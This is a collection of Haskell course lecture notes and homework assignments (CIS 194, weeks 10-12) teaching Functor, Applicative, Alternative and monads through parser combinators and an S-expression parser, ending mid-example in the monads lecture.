~~~~ {.haskell}
instance Functor IO where
  fmap f ioa = ioa >>= (\a -> return (f a))
~~~~

or even 

> instance Functor IO where
>   fmap f ioa = ioa >>= (return . f)

Now let's try something a bit more mind-twisting: 

> instance Functor ((->) e) where

What!? Well, let's follow the types: if `f = (->) e` then we want

> fmap :: (a -> b) -> (->) e a -> (->) e b

or, with `(->)` written infix: 

> fmap :: (a -> b) -> (e -> a) -> (e -> b)

Hmm, this type signature seems familiar...

> instance Functor ((->) e) where
>   fmap = (.)

Crazy!  What does this mean?  Well, one way to think of a value of
type `(e -> a)` is as a "`e`-indexed container" with one value of `a`
for each value of `e`.  To map a function over every value in such a
container corresponds exactly to function composition: to pick an
element out of the transformed container, we first we apply the `(e ->
a)` function to pick out an `a` from the original container, and then
apply the `(a -> b)` function to transform the element we picked.

 <!--

Local Variables: 
mode:markdown
compile-command:"mk pre"
End:

-->



/CS194 Lectures 10 Applicative functors, Part I
===============================================

 <!-- CLASS

> {-# LANGUAGE GeneralizedNewtypeDeriving, NoMonomorphismRestriction #-}

-->

CIS 194 Week 10  
25 March 2012

Suggested reading: 

  * [Applicative Functors](http://learnyouahaskell.com/functors-applicative-functors-and-monoids#applicative-functors) from Learn You a Haskell
  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)

Motivation
----------

Consider the following `Employee` type: 

> type Name = String
>
> data Employee = Employee { name    :: Name
>                          , phone   :: String }
>                 deriving Show

Of course, the `Employee` constructor has type 

~~~~ {.haskell}
Employee :: Name -> String -> Employee
~~~~

That is, if we have a `Name` and a `String`, we can apply the
`Employee` constructor to build an `Employee` object.

Suppose, however, that we don't have a `Name` and a `String`; what we
actually have is a `Maybe Name` and a `Maybe String`.  Perhaps they
came from parsing some file full of errors, or from a form where some
of the fields might have been left blank, or something of that sort.
We can't necessarily make an `Employee`.  But surely we can make a
`Maybe Employee`.  That is, we'd like to take our `(Name -> String ->
Employee)` function and turn it into a `(Maybe Name -> Maybe String ->
Maybe Employee)` function.  Can we write something with this type?

~~~~ {.haskell}
(Name -> String -> Employee) ->
(Maybe Name -> Maybe String -> Maybe Employee)
~~~~

Sure we can, and I am fully confident that you could write it in your
sleep by now.  We can imagine how it would work: if either the name or
string is `Nothing`, we get `Nothing` out; if both are `Just`, we get
out an `Employee` built using the `Employee` constructor (wrapped in
`Just`).  But let's keep going...

Consider this: now instead of a `Name` and a `String` we have a
`[Name]` and a `[String]`.  Maybe we can get an `[Employee]` out of
this?  Now we want

~~~~ {.haskell}
(Name -> String -> Employee) ->
([Name] -> [String] -> [Employee])
~~~~

We can imagine two different ways for this to work: we could match up
corresponding `Name`s and `String`s to form `Employee`s; or we could
pair up the `Name`s and `String`s in all possible ways.

Or how about this: we have an `(e -> Name)` and `(e -> String)`
for some type `e`.  For example, perhaps `e` is some huge data
structure, and we have functions telling us how to extract a `Name` and
a `String` from it.  Can we make it into an `(e -> Employee)`, that
is, a recipe for extracting an `Employee` from the same structure?

~~~~ {.haskell}
(Name -> String -> Employee) ->
((e -> Name) -> (e -> String) -> (e -> Employee))
~~~~

No problem, and this time there's really only one way to write this
function.

Generalizing
------------

Now that we've seen the usefulness of this sort of pattern, let's
generalize a bit.  The type of the function we want really looks
something like this:

~~~~ {.haskell}
(a -> b -> c) -> (f a -> f b -> f c)
~~~~

Hmm, this looks familiar... it's quite similar to the type of `fmap`!

~~~~ {.haskell}
fmap :: (a -> b) -> (f a -> f b)
~~~~

The only difference is an extra argument; we might call our desired
function `fmap2`, since it takes a function of two arguments.  Perhaps
we can write `fmap2` in terms of `fmap`, so we just need a `Functor`
constraint on `f`:

> fmap2 :: Functor f => (a -> b -> c) -> (f a -> f b -> f c)
> fmap2 h fa fb = undefined

Try hard as we might, however, `Functor` does not quite give us enough
to implement `fmap2`.  What goes wrong?  We have

~~~~ {.haskell}
h  :: a -> b -> c
fa :: f a
fb :: f b
~~~~

Note that we can also write the type of `h` as `a -> (b -> c)`. So,
we have a function that takes an `a`, and we have a value of type `f
a`... the only thing we can do is use `fmap` to lift the function over
the `f`, giving us a result of type:

~~~~ {.haskell}
h         :: a -> (b -> c)
fmap h    :: f a -> f (b -> c)
fmap h fa :: f (b -> c)
~~~~

OK, so now we have something of type `f (b -> c)` and something of
type `f b`... and here's where we are stuck!  `fmap` does not help any
more.  It gives us a way to apply functions to values inside a
`Functor` context, but what we need now is to apply a functions *which
are themselves in a `Functor` context* to values in a `Functor` context.

Applicative
-----------

Functors for which this sort of "contextual application" is possible
are called *applicative*, and the `Applicative` class (defined in
[`Control.Applicative`](http://haskell.org/ghc/docs/latest/html/libraries/base/Control-Applicative.html))
captures this pattern.

> class Functor f => Applicative f where
>   pure  :: a -> f a
>   (<*>) :: f (a -> b) -> f a -> f b

The `(<*>)` operator (often pronounced "ap", short for "apply")
encapsulates exactly this principle of "contextual application".  Note
also that the `Applicative` class requires its instances to be
instances of `Functor` as well, so we can always use `fmap` with
instances of `Applicative`.  Finally, note that `Applicative` also has
another method, `pure`, which lets us inject a value of type `a` into
a container.  For now, it is interesting to note that `fmap0` would be
another reasonable name for `pure`:

~~~~ {.haskell}
pure  :: a             -> f a
fmap  :: (a -> b)      -> f a -> f b
fmap2 :: (a -> b -> c) -> f a -> f b -> f c
~~~~

Now that we have `(<*>)`, we can implement `fmap2`, which in the
standard library is actually called `liftA2`:

> liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c
> liftA2 h fa fb = (h `fmap` fa) <*> fb

In fact, this pattern is so common that `Control.Applicative` defines
`(<$>)` as a synonym for `fmap`,

> (<$>) :: Functor f => (a -> b) -> f a -> f b
> (<$>) = fmap

so that we can write 

~~~~ {.haskell}
liftA2 h fa fb = h <$> fa <*> fb
~~~~

What about `liftA3`?

> liftA3 :: Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d
> liftA3 h fa fb fc = ((h <$> fa) <*> fb) <*> fc

(Note that the precedence and associativity of `(<$>)` and `(<*>)` are
actually defined in such a way that all the parentheses above are
unnecessary.)

Nifty!  Unlike the jump from `fmap` to `liftA2` (which required
generalizing from `Functor` to `Applicative`), going from `liftA2` to
`liftA3` (and from there to `liftA4`, ...) requires no extra
power---`Applicative` is enough.

Actually, when we have all the arguments like this we usually don't
bother calling `liftA2`, `liftA3`, and so on, but just use the `f <$>
x <*> y <*> z <*> ...` pattern directly. (`liftA2` and friends do come
in handly for partial application, however.)

But what about `pure`?  `pure` is for situations where we want to
apply some function to arguments in the context of some functor `f`,
but one or more of the arguments is *not* in `f`---those arguments
are "pure", so to speak.  We can use `pure` to lift them up into `f`
first before applying.  Like so:

> liftX :: Applicative f => (a -> b -> c -> d) -> f a -> b -> f c -> f d
> liftX h fa b fc = h <$> fa <*> pure b <*> fc

Applicative laws
----------------

There is only one really "interesting" law for `Applicative`:

~~~~ {.haskell}
f `fmap` x === pure f <*> x
~~~~

Mapping a function `f` over a container `x` ought to give the same
results as first injecting the function into the container, and then
applying it to `x` with `(<*>)`.

There are other laws, but they are not as instructive; you can read
about them on your own if you really want.

Applicative examples
--------------------

**Maybe**

Let's try writing some instances of `Applicative`, starting with
`Maybe`.  `pure` works by injecting a value into a `Just` wrapper;
`(<*>)` is function application with possible failure.  The result is
`Nothing` if either the function or its argument are.

> instance Applicative Maybe where
>   pure              = Just
>   Nothing <*> _     = Nothing
>   _ <*> Nothing     = Nothing
>   Just f <*> Just x = Just (f x)

Let's see an example:

> m_name1, m_name2 :: Maybe Name
> m_name1 = Nothing
> m_name2 = Just "Brent"
>
> m_phone1, m_phone2 :: Maybe String
> m_phone1 = Nothing
> m_phone2 = Just "555-1234"
>
> exA = Employee <$> m_name1 <*> m_phone1
> exB = Employee <$> m_name1 <*> m_phone2
> exC = Employee <$> m_name2 <*> m_phone1
> exD = Employee <$> m_name2 <*> m_phone2


 <!--

Local Variables: 
mode:markdown
compile-command:"mk pre"
End:

-->

/CIS 194: Homework 10
=====================

CIS 194: Homework 10 
Due Monday, April 1

*  Files you should submit: AParser.hs. You should take the versions
   that we have provided and add your solutions to them.

Introduction

A parser is an algorithm which takes unstructured data as input 
(often a String) and produces structured data as output. For example,
when you load a Haskell file into ghci, the first thing it does is parse
your file in order to turn it from a long String into an abstract syntax
tree representing your code in a more structured form.

Concretely, we will represent a parser for a value of type a as a
function which takes a String represnting the input to be parsed,
and succeeds or fails; if it succeeds, it returns the parsed value along
with whatever part of the input it did not use.
::

   newtype Parser a
   = Parser { runParser :: String -> Maybe (a, String) }

For example, satisfy takes a Char predicate and constructs a
parser which succeeds only if it sees a Char that satisfies the predicate 
(which it then returns). If it encounters a Char that does not
satisfy the predicate (or an empty input), it fails.
::

   satisfy :: (Char -> Bool) -> Parser Char
   satisfy p = Parser f
   where
   f [] = Nothing -- fail on the empty input
   f (x:xs) -- check if x satisfies the predicate
   -- if so, return x along with the remainder
   -- of the input (that is, xs)
   | p x = Just (x, xs)
   | otherwise = Nothing -- otherwise, fail

Using satisfy, we can also define the parser char, which expects to
see exactly a given character and fails otherwise.
::

   char :: Char -> Parser Char
   char c = satisfy (== c)

For example: 

   *Parser> runParser (satisfy isUpper) "ABC"
   Just (’A’,"BC")
   cis 194: homework 10 2
   *Parser> runParser (satisfy isUpper) "abc"
   Nothing
   *Parser> runParser (char ’x’) "xyz"
   Just (’x’,"yz")

For convenience, we’ve also provided you with a parser for positive integers:

   posInt :: Parser Integer
   posInt = Parser f
   where
   f xs
   | null ns = Nothing
   | otherwise = Just (read ns, rest)
   where (ns, rest) = span isDigit xs

Tools for building parsers

However, implementing parsers explicitly like this is tedious and
error-prone for anything beyond the most basic primitive parsers.
The real power of this approach comes from the ability to create complex 
parsers by combining simpler ones. And this power of combining
will be given to us by. . . you guessed it, Applicative.

Exercise 1

First, you’ll need to implement a Functor instance for Parser.
Hint: You may find it useful to implement a function

   first :: (a -> b) -> (a,c) -> (b,c)

Exercise 2

Now implement an Applicative instance for Parser: 

*  pure a represents the parser which consumes no input and successfully 
   returns a result of a.

*  p1 <*> p2 represents the parser which first runs p1 (which will
   consume some input and produce a function), then passes the
   remaining input to p2 (which consumes more input and produces
   some value), then returns the result of applying the function to the
   value. However, if either p1 or p2 fails then the whole thing should
   also fail (put another way, p1 <*> p2 only succeeds if both p1 and
   p2 succeed).

So what is this good for? Recalling the Employee example from
class,

   type Name = String
   data Employee = Emp { name :: Name, phone :: String }

we could now use the Applicative instance for Parser to make an
employee parser from name and phone parsers. That is, if

   parseName :: Parser Name
   parsePhone :: Parser String
   then
   Emp <$> parseName <*> parsePhone :: Parser Employee

is a parser which first reads a name from the input, then a phone
number, and returns them combined into an Employee record. Of
course, this assumes that the name and phone number are right
next to each other in the input, with no intervening separators. We’ll
see later how to make parsers that can throw away extra stuff that
doesn’t directly correspond to information you want to parse.

Exercise 3

We can also test your Applicative instance using other simple
applications of functions to multiple parsers. You should implement
each of the following exercises using the Applicative interface to put
together simpler parsers into more complex ones. Do not implement
them using the low-level definition of a Parser! In other words, 
pretend that you do not have access to the Parser constructor or even
know how the Parser type is defined.

*  Create a parser

      abParser :: Parser (Char, Char)

   which expects to see the characters ’a’ and ’b’ and returns them
   as a pair. That is,

      *AParser> runParser abParser "abcdef"
      Just ((’a’,’b’),"cdef")
      *AParser> runParser abParser "aebcdf"
      Nothing

*  Now create a parser

      abParser_ :: Parser ()

   which acts in the same way as abParser but returns () instead of
   the characters ’a’ and ’b’.

      *AParser> runParser abParser_ "abcdef"
      Just ((),"cdef")
      *AParser> runParser abParser_ "aebcdf"
      Nothing

*  Create a parser intPair which reads two integer values separated
   by a space and returns the integer values in a list. You should use
   the provided posInt to parse the integer values.

      *Parser> runParser intPair "12 34"
      Just ([12,34],"")

Exercise 4

Applicative by itself can be used to make parsers for simple, fixed
formats. But for any format involving choice (e.g. “. . . after the colon
there can be a number or a word or parentheses. . . ”) Applicative is
not quite enough. To handle choice we turn to the Alternative class,
defined (essentially) as follows:

   class Applicative f => Alternative f where
   empty :: f a
   (<|>) :: f a -> f a -> f a

(<|>) is intended to represent choice: that is, f1 <|> f2 represents
a choice between f1 and f2. empty should be the identity element for
(<|>), and often represents failure.

Write an Alternative instance for Parser: 

*  empty represents the parser which always fails.

*  p1 <|> p2 represents the parser which first tries running p1. If
   p1 succeeds then p2 is ignored and the result of p1 is returned.
   Otherwise, if p1 fails, then p2 is tried instead.

Hint: there is already an Alternative instance for Maybe which you
may find useful.

Exercise 5 Implement a parser

   intOrUppercase :: Parser ()

which parses either an integer value or an uppercase character, and
fails otherwise.

   *Parser> runParser intOrUppercase "342abcd"
   Just ((), "abcd")
   *Parser> runParser intOrUppercase "XYZ"
   Just ((), "YZ")
   *Parser> runParser intOrUppercase "foo"
   Nothing

Next week, we will use your parsing framework to build a more
sophisticated parser for a small programming language!

https://www.seas.upenn.edu/~cis1940/spring13/extras/10-applicative/AParser.hs

.. code-block:: hs

   {- CIS 194 HW 10
      due Monday, 1 April
   -}

   module AParser where

   import           Control.Applicative

   import           Data.Char

   -- A parser for a value of type a is a function which takes a String
   -- represnting the input to be parsed, and succeeds or fails; if it
   -- succeeds, it returns the parsed value along with the remainder of
   -- the input.
   newtype Parser a = Parser { runParser :: String -> Maybe (a, String) }

   -- For example, 'satisfy' takes a predicate on Char, and constructs a
   -- parser which succeeds only if it sees a Char that satisfies the
   -- predicate (which it then returns).  If it encounters a Char that
   -- does not satisfy the predicate (or an empty input), it fails.
   satisfy :: (Char -> Bool) -> Parser Char
   satisfy p = Parser f
     where
       f [] = Nothing    -- fail on the empty input
       f (x:xs)          -- check if x satisfies the predicate
                           -- if so, return x along with the remainder
                           -- of the input (that is, xs)
           | p x       = Just (x, xs)
           | otherwise = Nothing  -- otherwise, fail

   -- Using satisfy, we can define the parser 'char c' which expects to
   -- see exactly the character c, and fails otherwise.
   char :: Char -> Parser Char
   char c = satisfy (== c)

   {- For example:

   *Parser> runParser (satisfy isUpper) "ABC"
   Just ('A',"BC")
   *Parser> runParser (satisfy isUpper) "abc"
   Nothing
   *Parser> runParser (char 'x') "xyz"
   Just ('x',"yz")

   -}

   -- For convenience, we've also provided a parser for positive
   -- integers.
   posInt :: Parser Integer
   posInt = Parser f
     where
       f xs
         | null ns   = Nothing
         | otherwise = Just (read ns, rest)
         where (ns, rest) = span isDigit xs

   ------------------------------------------------------------
   -- Your code goes below here
   ------------------------------------------------------------


/CS194 Lectures 11 Applicative functors, Part II
================================================

CIS 194 Week 11  
1 April 2012

Suggested reading: 

  * [Applicative Functors](http://learnyouahaskell.com/functors-applicative-functors-and-monoids#applicative-functors) from Learn You a Haskell
  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)

We begin with a review of the `Functor` and `Applicative` type
classes:

> class Functor f where
>   fmap :: (a -> b) -> f a -> f b
>
> class Functor f => Applicative f where
>   pure  :: a -> f a
>   (<*>) :: f (a -> b) -> f a -> f b

Every `Applicative` is also a `Functor`---so can we implement `fmap`
in terms of `pure` and `(<*>)`?  Let's try!

> fmap g x = pure g <*> x

Well, that has the right type at least!  However, it's not hard to
imagine making `Functor` and `Applicative` instances for some type
such that this equality does not hold.  Since this would be a fairly
dubious situation, we stipulate as a *law* that this equality must
hold---this is a formal way of stating that the `Functor` and
`Applicative` instances for a given type must "play nicely together".

Now, let's see a few more examples of `Applicative` instances.

More Applicative Examples
-------------------------

**Lists**

How about an instance of `Applicative` for lists?  There are actually
two possible instances: one that matches up the list of functions and
list of arguments elementwise (that is, it "zips" them together), and
one that combines functions and arguments in all possible ways.

First, let's write the instance that does all possible combinations.
(For reasons that will become clear next week, this is the default
instance.)  From this point of view, lists represent nondeterminism:
that is, a value of type `[a]` can be thought of as a single value
with multiple possibilities.  Then `(<*>)` corresponds to
nondeterministic function application---that is, the application of a
nondeterministic function to a nondeterministic argument.

> instance Applicative [] where
>   pure a        = [a]          -- a "deterministic" value
>   [] <*> _      = []
>   (f:fs) <*> as = (map f as) ++ (fs <*> as)

Here's an example:

> names  = ["Joe", "Sara", "Mae"]
> phones = ["555-5555", "123-456-7890", "555-4321"]
>
> employees1 = Employee <$> names <*> phones

Maybe this particular example doesn't make that much sense, but it's
not hard to imagine situations where you want to combine things in all
possible ways like this.  For example, we can do nondeterministic
arithmetic like so:

> (.+) = liftA2 (+)    -- addition lifted to some Applicative context
> (.*) = liftA2 (*)    -- same for multiplication
>
> -- nondeterministic arithmetic
> n = ([4,5] .* pure 2) .+ [6,1] -- (either 4 or 5) times 2, plus either 6 or 1
>
> -- and some possibly-failing arithmetic too, just for fun
> m1 = (Just 3 .+ Just 5) .* Just 8
> m2 = (Just 3 .+ Nothing) .* Just 8

Next, let's write the instance that does elementwise combining.
First, we must answer an important question: how should we handle
lists of different lengths?  Some thought reveals that the most
sensible thing to do is to truncate the longer list to the length of
the shorter, throwing away the extra elements.  Of course there are
other possible answers: we might, for instance, extend the shorter
list by copying the last element (but then what do we do when one of
the lists is empty?); or extend the shorter list with a "neutral"
element (but then we would have to require an instance of `Monoid`, or
an extra "default" argument for the application).

This decision in turn dictates how we must implement `pure`, since we
must obey the law

~~~~ {.haskell}
pure f <*> xs === f <$> xs
~~~~

Notice that the right-hand side is a list with the same length as
`xs`, formed by applying `f` to every element in `xs`.  The only way
we can make the left-hand side turn out the same... is for `pure` to
create an infinite list of copies of `f`, because we don't know in
advance how long `xs` is going to be.

We implement the instance using a `newtype` wrapper to distinguish it
from the other list instance. The standard Prelude function `zipWith`
also comes in handy.

> newtype ZipList a = ZipList { getZipList :: [a] }
>   deriving (Eq, Show, Functor)
>
> instance Applicative ZipList where
>   pure = ZipList . repeat
>   ZipList fs <*> ZipList xs = ZipList (zipWith ($) fs xs)

An example:

> employees2 = getZipList $ Employee <$> ZipList names <*> ZipList phones

**Reader/environment**

Let's do one final example instance, for `(->) e`.  This is known as
the *reader* or *environment* applicative, since it allows "reading"
from the "environment" `e`.  Implementing the instance is not too
hard, we just have to use our nose and follow the types:

> instance Functor ((->) e) where
>   fmap = (.)
>
> instance Applicative ((->) e) where
>   pure = const
>   f <*> x = \e -> (f e) (x e)

An `Employee` example:

> data BigRecord = BR { getName         :: Name
>                     , getSSN          :: String
>                     , getSalary       :: Integer
>                     , getPhone        :: String
>                     , getLicensePlate :: String
>                     , getNumSickDays  :: Int
>                     }
>
> r = BR "Brent" "XXX-XX-XXX4" 600000000 "555-1234" "JGX-55T3" 2
>
> getEmp :: BigRecord -> Employee
> getEmp = Employee <$> getName <*> getPhone
>
> exQ = getEmp r

Aside: Levels of Abstraction
----------------------------

`Functor` is a nifty tool but relatively straightforward.  At first
glance it seems like `Applicative` doesn't add that much beyond what
`Functor` already provides, but it turns out that it's a small
addition with a huge impact.  `Applicative` (and as we will see next
week, `Monad`) deserves to be called a "model of computation", while
`Functor` doesn't.

When working with things like `Applicative` and `Monad`, it's very
important to keep in mind that there are *multiple levels of
abstraction* involved.  Roughly speaking, an *abstraction* is
something which *hides details* of a lower level, providing a
"high-level" interface that can be used (ideally) without thinking
about the lower level---although the details of the lower level often
"leak through" in certain cases.  This idea of layers of abstraction
is widespread. Think about user programs---OS---kernel---integrated
circuits---gates---silicon, or HTTP---TCP---IP---Ethernet, or
programming languages---bytecode---assembly---machine code.  As we
have seen, Haskell gives us many nice tools for constructing multiple
layers of abstraction *within Haskell programs themselves*, that is,
we get to dynamically extend the "programming language" layer stack
upwards.  This is a powerful facility but can lead to confusion.  One
must learn to explicitly be able to think on multiple levels, and to
switch between levels.

With respect to `Applicative` and `Monad` in particular, there are
just two levels to be concerned with.  The first is the level of
implementing various `Applicative` and `Monad` instances, *i.e.* the
"raw Haskell" level.  You gained some experience with this level in
your previous homework, when you implemented an `Applicative` instance
for `Parser`.

Once we have an `Applicative` instance for a type like `Parser`, the
point is that we get to "move up a layer" and program with `Parser`s
*using the `Applicative` interface*, without thinking about the
details of how `Parser` and its `Applicative` instance are actually
implemented.  You got a little bit of experience with this on last
week's homework, and will get a lot more of it this week. Programming
at this level has a very different feel than actually implementing the
instances.  Let's see some examples.

The Applicative API
-------------------

One of the benefits of having a unified interface like `Applicative`
is that we can write generic tools and control structures that work
with *any* type which is an instance of `Applicative`.  As a first
example, let's try writing

> pair :: Applicative f => f a -> f b -> f (a,b)

`pair` takes two values and pairs them, but all in the context of some
`Applicative f`.  As a first try we can take a function for pairing
and "lift" it over the arguments using `(<$>)` and `(<*>)`:

> pair fa fb = (\x y -> (x,y)) <$> fa <*> fb

This works, though we can simplify it a bit.  First, note that Haskell
allows the special syntax `(,)` to represent the pair constructor, so
we can write

> pair fa fb = (,) <$> fa <*> fb

But actually, we've seen this pattern before---this is the `liftA2`
pattern which got us started down this whole `Applicative` road.  So
we can further simplify to

> pair fa fb = liftA2 (,) fa fb

but now there is no need to explicitly write out the function
arguments, so we reach our final simplified version:

> pair = liftA2 (,)

Now, what does this function do?  It depends, of course, on the
particular `f` chosen.  Let's consider a number of particular
examples:

  * `f = Maybe`: the result is `Nothing` if either of the arguments
    is; if both are `Just` the result is `Just` their pairing.
  * `f = []`: `pair` computes the Cartesian product of two lists.
  * `f = ZipList`: `pair` is the same as the standard `zip` function.
  * `f = IO`: `pair` runs two `IO` actions in sequence, returning a
    pair of their results.
  * `f = Parser`: `pair` runs two parsers in sequence (the parsers
    consume consecutive sections of the input), returning their
    results as a pair.  If either parser fails, the whole thing fails.

Can you implement the following functions?  Consider what each
function does when `f` is replaced with each of the above types.

> (*>)       :: Applicative f => f a -> f b -> f b
> mapA       :: Applicative f => (a -> f b) -> ([a] -> f [b])
> sequenceA  :: Applicative f => [f a] -> f [a]
> replicateA :: Applicative f => Int -> f a -> f [a]

 <!--

Local Variables: 
mode:markdown
compile-command:"mk pre"
End:

-->


/CIS 194: Homework 11
=========================

CIS 194: Homework 11 
Due Monday, April 8

*  Files you should submit: SExpr.hs. You should take the version
   that we have provided and add your solutions. Note that we have
   also provided AParser.hs—you are welcome to use your own
   AParser.hs from last week’s homework or ours, whichever you
   prefer.

Parsing S-expressions


In AParser.hs from last week’s homework, we now have the following: 

*  the definition of a basic Parser type
*  a few primitive parsers such as satisfy, char, and posInt
*  Functor, Applicative, and Alternative instances for Parser

So, what can we do with this? It may not seem like we have much to
go on, but it turns out we can actually do quite a lot.

Remember, for this week’s homework you should only need to
write code on top of the interface provided by the Functor, Applicative,
and Alternative instances. In particular, you should not write any
code that depends on the details of the Parser implementation. (To
help with this, the version of AParser.hs we provided this week does
not even export the Parser constructor, so it is literally impossible to
depend on the details!)

Exercise 1

First, let’s see how to take a parser for (say) widgets and turn it
into a parser for lists of widgets. In particular, there are two functions
you should implement: zeroOrMore takes a parser as input and runs
it consecutively as many times as possible (which could be none, if
it fails right away), returning a list of the results. zeroOrMore always
succeeds. oneOrMore is similar, except that it requires the input parser
to succeed at least once. If the input parser fails right away then
oneOrMore also fails.

For example, below we use zeroOrMore and oneOrMore to parse a
sequence of uppercase characters. The longest possible sequence of
uppercase characters is returned as a list. In this case, zeroOrMore
and oneOrMore behave identically::

   *AParser> runParser (zeroOrMore (satisfy isUpper)) "ABCdEfgH"
   Just ("ABC","dEfgH")
   *AParser> runParser (oneOrMore (satisfy isUpper)) "ABCdEfgH"
   Just ("ABC","dEfgH")

The difference between them can be seen when there is not an uppercase 
character at the beginning of the input. zeroOrMore succeeds
and returns the empty list without consuming any input; oneOrMore
fails.

   *AParser> runParser (zeroOrMore (satisfy isUpper)) "abcdeFGh"
   Just ("","abcdeFGh")
   *AParser> runParser (oneOrMore (satisfy isUpper)) "abcdeFGh"
   Nothing

Implement zeroOrMore and oneOrMore with the following type
signatures: Hint: To parse one or more occurrences
of p, run p once and then parse zero or more occurrences of p.
To parse zero or more occurrences of p, try parsing one
or more; if that fails, return the empty list.

   zeroOrMore :: Parser a -> Parser [a]
   oneOrMore :: Parser a -> Parser [a]

Exercise 2

There are a few more utility parsers needed before we can accomplish the 
final parsing task. First, spaces should parse a consecutive
list of zero or more whitespace characters (use the isSpace function
from the standard Data.Char module).

   spaces :: Parser String

Next, ident should parse an identifier, which for our purposes
will be an alphabetic character (use isAlpha) followed by zero or
more alphanumeric characters (use isAlphaNum). In other words, an
identifier can be any nonempty sequence of letters and digits, except
that it may not start with a digit.

   ident :: Parser String

For example: 

   *AParser> runParser ident "foobar baz"
   Just ("foobar"," baz")
   *AParser> runParser ident "foo33fA"
   Just ("foo33fA","")
   *AParser> runParser ident "2bad"
   Nothing
   *AParser> runParser ident ""
   Nothing

Exercise 3

S-expressions are a simple syntactic format for tree-structured data,
originally developed as a syntax for Lisp programs. We’ll close out
our demonstration of parser combinators by writing a simple Sexpression parser.
An identifier is represented as just a String; the format for valid
identifiers is represented by the ident parser you wrote in the previous exercise.

   type Ident = String

An “atom” is either an integer value (which can be parsed with
posInt) or an identifier.

   data Atom = N Integer | I Ident
   deriving Show

Finally, an S-expression is either an atom, or a list of S-expressions.
Actually, this is slightly different than the usual definition of S-expressions
in Lisp, which also includes binary “cons” cells; but it’s good enough for
our purposes.

   data SExpr = A Atom
   | Comb [SExpr]
   deriving Show

Textually, S-expressions can optionally begin and end with any
number of spaces; after throwing away leading and trailing spaces they
consist of either an atom, or an open parenthesis followed by one or
more S-expressions followed by a close parenthesis.

   atom ::= int
   | ident

   S ::= atom
   | (S∗)

For example, the following are all valid S-expressions: 

   5
   foo3
   (bar (foo) 3 5 874)
   (((lambda x (lambda y (plus x y))) 3) 5)
   ( lots of ( spaces in ) this ( one ) )

We have provided Haskell data types representing S-expressions in
SExpr.hs. Write a parser for S-expressions, that is, something of type

   parseSExpr :: Parser SExpr

Hints: To parse something but ignore its output, you can use the
(*>) and (<*) operators, which have the types

   (*>) :: Applicative f => f a -> f b -> f b
   (<*) :: Applicative f => f a -> f b -> f a

p1 *> p2 runs p1 and p2 in sequence, but ignores the result of
p1 and just returns the result of p2. p1 <* p2 also runs p1 and p2 in
sequence, but returns the result of p1 (ignoring p2’s result) instead.
For example:

   *AParser> runParser (spaces *> posInt) " 345"
   Just (345,"")

https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/AParser.hs

.. code-block:: hs

   module AParser (Parser, runParser, satisfy, char, posInt) where

   import           Control.Applicative
   import           Data.Char

   newtype Parser a = Parser { runParser :: String -> Maybe (a, String) }

   satisfy :: (Char -> Bool) -> Parser Char
   satisfy p = Parser f
     where
       f [] = Nothing
       f (x:xs)
           | p x       = Just (x, xs)
           | otherwise = Nothing

   char :: Char -> Parser Char
   char c = satisfy (== c)

   posInt :: Parser Integer
   posInt = Parser f
     where
       f xs
         | null ns   = Nothing
         | otherwise = Just (read ns, rest)
         where (ns, rest) = span isDigit xs

   inParser f = Parser . f . runParser

   first :: (a -> b) -> (a,c) -> (b,c)
   first f (x,y) = (f x, y)

   instance Functor Parser where
     fmap = inParser . fmap . fmap . first

   instance Applicative Parser where
     pure a = Parser (\s -> Just (a, s))
     (Parser fp) <*> xp = Parser $ \s ->
       case fp s of
         Nothing     -> Nothing
         Just (f,s') -> runParser (f <$> xp) s'

   instance Alternative Parser where
     empty = Parser (const Nothing)
     Parser p1 <|> Parser p2 = Parser $ liftA2 (<|>) p1 p2


https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/SExpr.hs

.. code-block:: hs

   {- CIS 194 HW 11
      due Monday, 8 April
   -}

   module SExpr where

   import AParser
   import Control.Applicative

   ------------------------------------------------------------
   --  1. Parsing repetitions
   ------------------------------------------------------------

   zeroOrMore :: Parser a -> Parser [a]
   zeroOrMore p = undefined

   oneOrMore :: Parser a -> Parser [a]
   oneOrMore p = undefined

   ------------------------------------------------------------
   --  2. Utilities
   ------------------------------------------------------------

   spaces :: Parser String
   spaces = undefined

   ident :: Parser String
   ident = undefined

   ------------------------------------------------------------
   --  3. Parsing S-expressions
   ------------------------------------------------------------

   -- An "identifier" is represented as just a String; however, only
   -- those Strings consisting of a letter followed by any number of
   -- letters and digits are valid identifiers.
   type Ident = String

   -- An "atom" is either an integer value or an identifier.
   data Atom = N Integer | I Ident
     deriving Show

   -- An S-expression is either an atom, or a list of S-expressions.
   data SExpr = A Atom
              | Comb [SExpr]
     deriving Show


/CS194 Lectures 12 Monads
=========================

 <!-- CLASS

> import Control.Monad
> import Control.Applicative

-->

CIS 194 Week 12  
8 April 2013

Suggested reading: 

  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)
  * [LYAH Chapter 12: A Fistful of Monads](http://learnyouahaskell.com/a-fistful-of-monads)
  * [LYAH Chapter 9: Input and Output](http://learnyouahaskell.com/input-and-output)
  * [RWH Chapter 7: I/O](http://book.realworldhaskell.org/read/io.html)
  * [RWH Chapter 14: Monads](http://book.realworldhaskell.org/read/monads.html)
  * [RWH Chapter 15: Programming with monads](http://book.realworldhaskell.org/read/programming-with-monads.html)

Motivation
----------

Over the last couple of weeks, we have seen how the `Applicative`
class allows us to idiomatically handle computations which take place
in some sort of "special context"---for example, taking into account
possible failure with `Maybe`, multiple possible outputs with `[]`,
consulting some sort of environment using `((->) e)`, or construct
parsers using a "combinator" approach, as in the homework.

However, so far we have only seen computations with a fixed structure,
such as applying a data constructor to a fixed set of arguments.  What
if we don't know the structure of the computation in advance -- that
is, we want to be able to decide what to do based on some intermediate
results?

As an example, recall the `Parser` type from the homework, and assume
that we have implemented `Functor` and `Applicative` instances for it:

> newtype Parser a = Parser { runParser :: String -> Maybe (a, String) }

~~~~ {.haskell}
instance Functor Parser where
  ...

instance Applicative Parser where 
  ...
~~~~

Recall that a value of type `Parser a` represents a *parser* which can
take a `String` as input and possibly produce a value of type `a`,
along with the remaining unparsed portion of the `String`.  For
example, a parser for integers, given as input the string

    "143xkkj"

might produce as output 

    Just (143, "xkkj")

As you saw in the homework, we can now write things like 

~~~~ {.haskell}
data Foo = Bar Int Int Char
